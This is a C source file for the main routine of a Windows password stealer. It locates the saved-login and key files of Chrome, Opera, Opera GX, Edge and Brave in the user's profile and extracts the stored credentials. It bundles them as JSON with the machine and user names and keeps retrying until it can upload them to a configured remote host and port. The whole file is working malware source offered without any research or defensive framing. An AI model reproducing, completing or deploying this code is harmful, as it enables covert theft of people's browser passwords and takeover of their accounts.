#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#include "chromium.h"
#include "credentials.h"
#include "connection.h"
#include "json/json.h"

#include CONFIG

static char* UserProfile;
static char* PathFormat = "%s\\%s\x00";
static char* dataFormat = "%d:%s:%s:%s\n\x00";

// No (backslash/slash) before path
char* pathFromUserProfile(const char* path) {
    size_t resultSize = (strlen(UserProfile) + strlen(path) + 2);
    char* result = malloc(resultSize);
    if(result == NULL) {
#ifdef DEBUG
        fprintf(stderr, "Memory Allocation Error!\n");
#endif
        return NULL;
    }
    sprintf_s(result, resultSize, PathFormat, UserProfile, path);
    return result;
}

int CALLBACK WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
{

    UserProfile = getenv("USERPROFILE");
    if(UserProfile == NULL)
        return -1;

    int sent;
    ChromiumBrowser* browsers[] = {
        initChromium(pathFromUserProfile("AppData\\Local\\Google\\Chrome\\User Data\\Local State"),
                     pathFromUserProfile("AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"), 
                     "Chrome"),
        initChromium(pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State"),
                     pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data"),
                     "OperaGX"),
        initChromium(pathFromUserProfile("AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"),
                     pathFromUserProfile("AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"), 
                     "Edge"),
        initChromium(pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera Stable\\Local State"),
                     pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"),
                     "Opera"),
	initChromium(pathFromUserProfile("AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"),
		     pathFromUserProfile("AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"),
		     "Brave")
    };

    size_t browsersCount = sizeof(browsers)/sizeof(browsers[0]);

    HINTERNET hSession = InitSession();
    HINTERNET hConnect = NULL;
    do {
         hConnect = Connect(hSession, HOSTNAME, PORT);
    } while (hConnect == NULL);

#ifdef DEBUG
    uint32_t credAmount = 0;
#endif

    char* pcname = getenv("COMPUTERNAME");
    if(pcname == NULL)
        pcname = "Unknown";
    char* username = getenv("USERNAME");
    if(username == NULL)
        username = "Unknown";

    JsonNode* list = json_mkarray();

    for(register int j = 0; j < browsersCount; j++)
    {
        credList* Credentials = dumpChromium( browsers[j] );
        if(Credentials == NULL || Credentials->size == 0)
            continue;
        for(register int i = 0; i < Credentials->size; i++)
        {
            JsonNode* credNode = credentialToJson(Credentials->creds+i);
            json_append_element(list, credNode);
#ifdef DEBUG
            credAmount++;
#endif
        }

        deallocCreds(Credentials);
    }

#ifdef DEBUG
    fprintf(stderr, "\nCredentials Amount: %d\n", credAmount);
#endif

    int bResult = 0;
    do {
        bResult = Upload(hConnect, json_encode(list), username, pcname);
        if(bResult == -1) {
            fprintf(stderr, "There");
            return -1;
        }
    } while(bResult == -2);

    for( register int i = 0; i < browsersCount; i++ )
    {
        free(browsers[i]->localState);
        free(browsers[i]->loginData);
        free(browsers[i]);
    }

    json_delete(list);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}

